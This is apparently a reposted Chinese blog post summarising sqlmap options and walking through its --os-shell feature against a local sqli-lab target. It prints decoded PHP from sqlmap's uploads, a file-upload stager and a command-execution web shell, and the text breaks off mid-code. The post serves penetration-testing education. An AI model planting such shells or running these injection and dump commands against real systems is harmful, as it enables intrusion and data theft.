{"title":"sqlmap使用总结","uid":"6e2bc51a8d48429972bd10fd836dd7b5","slug":"tooluse(sqlmap)","date":"2023-02-13T13:59:11.150Z","updated":"2023-08-06T08:00:51.000Z","comments":true,"path":"api/articles/tooluse(sqlmap).json","keywords":null,"cover":"/img/28.jpg","content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>原文作者: Ywc</code></p>\n<p><code>原文链接: https://yinwc.github.io/2018/07/05/tooluse(sqlmap)/</code></p>\n<p><code>发表日期: July 5th 2018, 1:20:40 pm</code></p>\n<p><code>版权声明:</code></p></blockquote>\n<span id=\"more\"></span>\n\n<h1 id=\"sqlmap使用总结\"><a href=\"#sqlmap使用总结\" class=\"headerlink\" title=\"sqlmap使用总结\"></a>sqlmap使用总结</h1><h2 id=\"选项\"><a href=\"#选项\" class=\"headerlink\" title=\"选项\"></a>选项</h2><p><code>–version</code> 显示程序的版本号并退出<br><code>-h, –help</code> 显示此帮助消息并退出<br><code>-v VERBOSE</code> 详细级别：0-6（默认为1）</p>\n<h3 id=\"Target-目标\"><a href=\"#Target-目标\" class=\"headerlink\" title=\"Target(目标)\"></a><strong>Target(目标)</strong></h3><p>以下至少需要设置其中一个选项，设置目标 URL。</p>\n<pre><code>-d DIRECT 直接连接到数据库。\n-u URL, –url=URL 目标 URL。\n-l LIST 从 Burp 或 WebScarab 代理的日志中解析目标。\n-r REQUESTFILE 从一个文件中载入 HTTP 请求。\n-g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。\n-c CONFIGFILE 从 INI 配置文件中加载选项。\n</code></pre>\n<h3 id=\"Request（请求）\"><a href=\"#Request（请求）\" class=\"headerlink\" title=\"Request（请求）\"></a><strong>Request（请求）</strong></h3><p>这些选项可以用来指定如何连接到目标URL。</p>\n<pre><code>–data=DATA 通过 POST 发送的数据字符串\n–cookie=COOKIE HTTP Cookie 头\n–cookie-urlencode URL 编码生成的 cookie 注入\n–drop-set-cookie 忽略响应的 Set –Cookie 头信息\n–user-agent=AGENT 指定 HTTP User –Agent 头\n–random-agent 使用随机选定的 HTTP User-Agent 头\n–referer=REFERER 指定 HTTP Referer 头\n–headers=HEADERS 换行分开，加入其他的 HTTP 头\n–auth-type=ATYPE HTTP 身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)\n–auth-cred=ACRED HTTP 身份验证凭据（用户名:密码）\n–auth-cert=ACERT HTTP 认证证书（key_file，cert_file）\n–proxy=PROXY 使用 HTTP 代理连接到目标 URL\n–proxy-cred=PCRED HTTP 代理身份验证凭据（用户名：密码）\n–ignore-proxy 忽略系统默认的 HTTP 代理\n–delay=DELAY 在每个 HTTP 请求之间的延迟时间，单位为秒\n–timeout=TIMEOUT 等待连接超时的时间（默认为30 秒）\n–retries=RETRIES 连接超时后重新连接的时间（默认3）\n–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式\n–safe-url=SAFURL 在测试过程中经常访问的 url 地址\n–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的 URL\n</code></pre>\n<h3 id=\"Optimization（优化）\"><a href=\"#Optimization（优化）\" class=\"headerlink\" title=\"Optimization（优化）\"></a><strong>Optimization（优化）</strong></h3><p>这些选项可用于优化 sqlmap.py 的性能。</p>\n<pre><code>-o 开启所有优化开关\n–predict-output 预测常见的查询输出\n–keep-alive 使用持久的 HTTP(S) 连接\n–null-connection 从没有实际的 HTTP 响应体中检索页面长度\n–threads=THREADS 最大的 HTTP(S) 请求并发量（默认为1）\n</code></pre>\n<h3 id=\"Injection（注入）\"><a href=\"#Injection（注入）\" class=\"headerlink\" title=\"Injection（注入）\"></a><strong>Injection（注入）</strong></h3><p>这些选项可以用来指定测试哪些参数，提供自定义的注入 payloads 和可选篡改脚本。</p>\n<pre><code>-p TESTPARAMETER 可测试的参数\n–dbms=DBMS 强制后端的 DBMS 为此值\n–os=OS 强制后端的 DBMS 操作系统为这个值\n–prefix=PREFIX 注入 payload 字符串前缀\n–suffix=SUFFIX 注入 payload 字符串后缀\n–tamper=TAMPER 使用给定的脚本篡改注入数据\n–tamper 通过编码绕过 WEB 防火墙（WAF）sqlmap.py 默认用 char()\n–tamper 插件所在目录\\sqlmap-dev\\tamper\n</code></pre>\n<h3 id=\"Detection（检测）\"><a href=\"#Detection（检测）\" class=\"headerlink\" title=\"Detection（检测）\"></a>Detection（检测）</h3><p>这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容</p>\n<pre><code>–level=LEVEL 执行测试的等级（1-5，默认为 1）\n–risk=RISK 执行测试的风险（0-3，默认为 1）\n–string=STRING 查询有效时在页面匹配字符串\n–regexp=REGEXP 查询有效时在页面匹配正则表达式\n–text-only 仅基于文本内容比较网页\n</code></pre>\n<p>这些选项可用于调整具体的 SQL 注入测试</p>\n<pre><code>–technique=TECH SQL 注入技术测试（默认 BEUST）\nTechniques（技巧）：\n–technique /*测试指定注入类型\\使用的技术\n</code></pre>\n<p>不加参数默认测试所有注入技术：</p>\n<p>不加参数默认测试所有注入技术：</p>\n<pre><code>B: 基于布尔的 SQL 盲注\nE: 基于显错 sql 注入\nU: 基于 UNION 注入\nS: 叠层 sql 注入\nT: 基于时间盲注\n</code></pre>\n<pre><code>–time-sec=TIMESEC DBMS 响应的延迟时间（默认为 5 秒）\n–union-cols=UCOLS 定列范围用于测试 UNION 查询注入\n–union-char=UCHAR 用于暴力猜解列数的字符\n</code></pre>\n<h3 id=\"Fingerprint（指纹）\"><a href=\"#Fingerprint（指纹）\" class=\"headerlink\" title=\"Fingerprint（指纹）\"></a>Fingerprint（指纹）</h3><pre><code>-f, –fingerprint 执行检查广泛的 DBMS 版本指纹\n</code></pre>\n<h3 id=\"Enumeration（枚举）\"><a href=\"#Enumeration（枚举）\" class=\"headerlink\" title=\"Enumeration（枚举）\"></a>Enumeration（枚举）</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句。</p>\n<pre><code>-b, –banner 检索数据库管理系统的标识\n–current-user 检索数据库管理系统当前用户\n–current-db 检索数据库管理系统当前数据库\n–is-dba 检测 DBMS 当前用户是否 DBA\n–users 枚举数据库管理系统用户\n–passwords 枚举数据库管理系统用户密码哈希\n–privileges 枚举数据库管理系统用户的权限\n–roles 枚举数据库管理系统用户的角色\n–dbs 枚举数据库管理系统数据库\n–tables 枚举 DBMS 数据库中的表\n–columns 枚举 DBMS 数据库表列\n–dump 转储数据库管理系统的数据库中的表项\n–dump-all 转储所有的 DBMS 数据库表中的条目\n–search 搜索列，表和/或数据库名称\n-D DB 要进行枚举的数据库名\n-T TBL 要进行枚举的数据库表\n-C COL 要进行枚举的数据库列\n-U USER 用来进行枚举的数据库用户\n–exclude-sysdbs 枚举表时排除系统数据库\n–start=LIMITSTART 第一个查询输出进入检索\n–stop=LIMITSTOP 最后查询的输出进入检索\n–first=FIRSTCHAR 第一个查询输出字的字符检索\n–last=LASTCHAR 最后查询的输出字字符检索\n–sql-query=QUERY 要执行的 SQL 语句\n–sql-shell 提示交互式 SQL 的 shell\n</code></pre>\n<h3 id=\"Brute-force-蛮力\"><a href=\"#Brute-force-蛮力\" class=\"headerlink\" title=\"Brute force(蛮力)\"></a>Brute force(蛮力)</h3><p>这些选项可以被用来运行蛮力检查。</p>\n<pre><code>–common-tables 检查存在共同表\n–common-columns 检查存在共同列\n</code></pre>\n<h3 id=\"User-defined-function-injection（用户自定义函数注入）\"><a href=\"#User-defined-function-injection（用户自定义函数注入）\" class=\"headerlink\" title=\"User-defined function injection（用户自定义函数注入）\"></a>User-defined function injection（用户自定义函数注入）</h3><p>这些选项可以用来创建用户自定义函数。</p>\n<p>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。</p>\n<pre><code>–udf-inject 注入用户自定义函数\n–shared-lib=SHLIB 共享库的本地路径\n</code></pre>\n<h3 id=\"File-system-access（访问文件系统）\"><a href=\"#File-system-access（访问文件系统）\" class=\"headerlink\" title=\"File system access（访问文件系统）\"></a>File system access（访问文件系统）</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>\n<p>File system access（访问文件系统）：<br>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>\n<pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件\n–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件\n–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径\n</code></pre>\n<h3 id=\"Operating-system-access（操作系统访问）\"><a href=\"#Operating-system-access（操作系统访问）\" class=\"headerlink\" title=\"[*]Operating system access（操作系统访问）\"></a>[*]Operating system access（操作系统访问）</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>\n<pre><code>–os-cmd=OSCMD 执行操作系统命令\n–os-shell 交互式的操作系统的 shell\n–os-pwn 获取一个 OOB shell，meterpreter 或 VNC\n–os-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC\n–os-bof 存储过程缓冲区溢出利用\n–priv-esc 数据库进程用户权限提升\n–msf-path=MSFPATH Metasploit Framework 本地的安装路径\n–tmp-path=TMPPATH 远程临时文件目录的绝对路径\n</code></pre>\n<h4 id=\"os-shell的使用\"><a href=\"#os-shell的使用\" class=\"headerlink\" title=\"-os-shell的使用\"></a><code>-os-shell</code>的使用</h4><p><a href=\"https://xz.aliyun.com/t/7942\">https://xz.aliyun.com/t/7942</a></p>\n<p><a href=\"https://blog.csdn.net/qq_61237064/article/details/124154956\">https://blog.csdn.net/qq_61237064/article/details/124154956</a></p>\n<pre><code>使用前提\n\n拥有网站的写入权限\n\nSecure_file_priv参数为空或者为指定路径\n</code></pre>\n<p>满足条件后</p>\n<h4 id=\"1-注入\"><a href=\"#1-注入\" class=\"headerlink\" title=\"1.注入\"></a>1.注入</h4><p>先对注入点探测</p>\n<pre><code>sqlmap -u http://127.0.0.1/sqli-lab/less-1/?id=1&quot;\n</code></pre>\n<p><img src=\"/post/tooluse(sqlmap)/image-20221112150328026.png\" alt=\"image-20221112150328026\"></p>\n<p>然后执行<code>--os-shell</code></p>\n<pre><code>sqlmap -u http://127.0.0.1/sqli-lab/less-1/?id=1&quot; --os-shell\n</code></pre>\n<p><img src=\"/post/tooluse(sqlmap)/image-20221112150107492.png\" alt=\"image-20221112150107492\"></p>\n<p>选择php语言</p>\n<p><img src=\"/post/tooluse(sqlmap)/image-20221112151004965.png\" alt=\"image-20221112151004965\"></p>\n<p>接着这个参数是选择绝对路径</p>\n<p><img src=\"/post/tooluse(sqlmap)/image-20221112151019786.png\" alt=\"image-20221112151019786\"></p>\n<pre><code>选项一为用这几个路径\n\n选项二为用户自己输入\n\n选项三为用用户的字典\n\n选项四为爆破。\n</code></pre>\n<p>我们满足前提的话，选择2，直接输入自己知道的路径</p>\n<p><img src=\"/post/tooluse(sqlmap)/image-20221112151155258.png\" alt=\"image-20221112151155258\"></p>\n<p>到这就完成了<code>--os-shell</code>的执行，来看看在<code>sqlmap</code>的执行效果</p>\n<p>对于上传的两个文件<code>tmpugvzq.php</code>和<code>tmpbylqf.php</code>我们在数据包中就可以看到，只需要解码就可以得到内容</p>\n<p><code>tmpugvzq.php</code></p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\">0x<span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"upload\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"uploadDir\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">phpversion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token string\">'4.1.0'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$HTTP_POST_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            @<span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$HTTP_POST_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            @<span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        @<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token number\">0755</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string\">\"File uploaded\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span> \n        <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string\">\"&lt;form action=\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"PHP_SELF\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token string\">\" method=POST enctype=multipart/form-data>&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000>&lt;b>sqlmap file uploader&lt;/b>&lt;br>&lt;input name=file type=file>&lt;br>to directory: &lt;input type=text name=uploadDir value=C:\\\\Users\\\\zhang\\\\Desktop\\\\php\\\\PHPTutorial\\\\WWW\\\\sqli-master\\\\Less-1\\\\> &lt;input type=submit name=upload value=upload>&lt;/form>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter\">?></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>根据上面的<code>mysql</code>语句，不难看出这是利用<code>into outfile</code>写入文件</p>\n<p><code>tmpbylqf.php</code></p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span> \n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"max_execution_time\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$z</span><span class=\"token operator\">=</span>@<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"disable_functions\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$z</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$z</span><span class=\"token operator\">=</span><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/[, ]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$z</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$z</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$z</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$z</span><span class=\"token operator\">=</span><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"trim\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$z</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$z</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">.</span><span class=\"token string\">\" 2>&amp;1\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$n</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$z</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> <span class=\"token function\">is_callable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$n</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">and</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$n</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$z</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token function\">ob_get_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"proc_open\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$y</span><span class=\"token operator\">=</span><span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>pipe<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>pipe<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>pipe<span class=\"token punctuation\">,</span>w<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token keyword\">NULL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$w</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    @<span class=\"token function\">proc_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell_exec\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"passthru\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token function\">ob_get_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"popen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$x</span><span class=\"token operator\">=</span><span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token keyword\">NULL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_resource</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token variable\">$w</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token function\">fread</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">,</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        @<span class=\"token function\">pclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$w</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$w</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token 